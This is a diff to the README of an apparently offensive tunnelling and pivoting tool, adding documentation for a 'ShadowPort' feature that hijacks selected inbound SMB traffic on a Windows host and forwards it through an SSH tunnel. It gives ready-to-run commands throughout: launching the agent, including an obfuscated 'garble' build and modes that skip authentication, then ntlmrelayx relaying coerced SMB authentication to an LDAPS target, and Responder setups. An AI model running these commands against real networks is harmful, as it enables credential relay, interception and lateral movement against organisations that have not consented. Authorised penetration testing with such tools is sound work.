@@ -35,6 +35,9 @@ Each bundle contains:
 - `agent-garble`
 - `README.md`
 
+The Windows AMD64 bundle also contains `agent-shadow.exe` and
+`agent-shadow-garble.exe` for the opt-in ShadowPort feature.
+
 Individual Windows executables and `SHA256SUMS.txt` are also attached to the
 release.
 
@@ -241,6 +244,136 @@ man-in-the-middle can impersonate the proxy. Restrict the listener with
 firewall rules and disable no-auth mode after the assessment.
 
 Both sides must opt in. A no-auth agent is rejected by a normal proxy.
+
+## ShadowPort: receive selected SMB traffic while Windows owns port 445
+
+ShadowPort is available only in the separate Windows AMD64 binaries:
+
+- `agent-shadow.exe`
+- `agent-shadow-garble.exe`
+
+It intercepts only inbound TCP/445 traffic from an explicit source allowlist,
+rewrites it to an unoccupied internal port, and sends the accepted TCP stream
+through the existing SSH listener channel. Other sources continue to the
+native Windows SMB service. It does not require WebDAV and does not stop,
+replace, or reconfigure the service owned by PID 4.
+
+ShadowPort requires an elevated Administrator token; SYSTEM is not required.
+The target receives one EXE. The official signed WinDivert 2.2.2 AMD64 driver
+and its DLL are embedded in that EXE, hash-checked, extracted into a protected
+temporary directory only when a ShadowPort listener starts, and removed when
+the listener stops. A supported Windows driver cannot be loaded without
+materializing it on disk. Abruptly killing the process can leave that temporary
+directory behind. The agent also creates a temporary Windows Firewall allow
+rule scoped to the exact internal IP, port, and source allowlist; it removes
+the rule on listener shutdown. This uses the built-in Windows PowerShell
+firewall cmdlets and installs no additional dependency.
+
+### Agent with an SSH key
+
+```powershell
+.\agent-shadow.exe `
+  -connect ssh://PROXY_IP:22 `
+  -ssh-user ligolo `
+  -ssh-key .\agent `
+  -ssh-host-key-fingerprint "SHA256:REPLACE_WITH_PROXY_FINGERPRINT" `
+  -allow-shadow-port `
+  -retry `
+  -reconnect
+```
+
+### Agent without an SSH key
+
+Pinned proxy fingerprint:
+
+```powershell
+.\agent-shadow.exe `
+  -connect ssh://PROXY_IP:22 `
+  -ssh-user ligolo `
+  -ssh-insecure-no-auth `
+  -ssh-host-key-fingerprint "SHA256:REPLACE_WITH_PROXY_FINGERPRINT" `
+  -allow-shadow-port `
+  -retry `
+  -reconnect
+```
+
+Binary-only, without proxy verification:
+
+```powershell
+.\agent-shadow.exe `
+  -connect ssh://PROXY_IP:22 `
+  -ssh-user ligolo `
+  -ssh-insecure-no-auth `
+  -ssh-insecure-ignore-host-key `
+  -allow-shadow-port `
+  -retry `
+  -reconnect
+```
+
+`agent-shadow-garble.exe` accepts the same flags.
+
+### Receive SMB on proxy port 8445
+
+Run the SMB receiver on the same machine as the proxy. Current Impacket
+supports a custom SMB listener port:
+
+```bash
+sudo ntlmrelayx.py \
+  -ip 127.0.0.1 \
+  --smb-port 8445 \
+  -smb2support \
+  -t ldaps://RELAY_TARGET
+```
+
+Responder can be used instead. Run it on a proxy interface, then point `--to`
+at that interface's TCP/445 address:
+
+```bash
+sudo responder -I PROXY_INTERFACE -v
+```
+
+```text
+listener_add --tcp --addr AGENT_IPV4:445 --to PROXY_INTERFACE_IPV4:445 --shadow-port --shadow-internal-port 8445 --shadow-source COERCED_HOST_IPV4_OR_CIDR
+```
+
+Then select the ShadowPort agent in the proxy console and create the listener:
+
+```text
+session
+listener_add --tcp --addr AGENT_IPV4:445 --to 127.0.0.1:8445 --shadow-port --shadow-internal-port 8445 --shadow-source COERCED_HOST_IPV4_OR_CIDR
+```
+
+Use the exact IPv4 address assigned to the Windows agent; `0.0.0.0:445` is
+intentionally rejected. `--shadow-source` accepts one or more comma-separated
+IPv4 addresses/CIDRs and should be as narrow as possible. The internal port
+must be free on the agent; the `--to` port is independently chosen for the
+receiver beside the proxy. Stop the listener with `listener_stop`; this closes
+the diversion before releasing the internal socket and removes the runtime
+files and temporary firewall rule.
+
+Inspect the expected state from an elevated Windows PowerShell:
+
+```powershell
+Get-NetTCPConnection -State Listen |
+  Where-Object LocalPort -In 445,8445 |
+  Format-Table LocalAddress,LocalPort,OwningProcess
+Get-NetFirewallRule -DisplayName 'Ligolo ShadowPort *' -ErrorAction SilentlyContinue
+Get-ChildItem -LiteralPath $env:TEMP -Directory -Filter 'ligolo-shadowport-*'
+```
+
+After `listener_stop`, the last two commands should return nothing and PID 4
+should still own TCP/445. If the process was killed and normal cleanup could not
+run, remove only ShadowPort residue from an elevated PowerShell:
+
+```powershell
+Get-NetFirewallRule -Name 'LigoloShadowPort-*' -ErrorAction SilentlyContinue |
+  Remove-NetFirewallRule
+Get-ChildItem -LiteralPath $env:TEMP -Directory -Filter 'ligolo-shadowport-*' |
+  Remove-Item -Recurse -Force
+```
+
+The Web UI exposes the same settings under **Add New > ShadowPort** only when
+the selected agent advertises `shadowport-smb-v1`.
 
 ## Start the tunnel
 
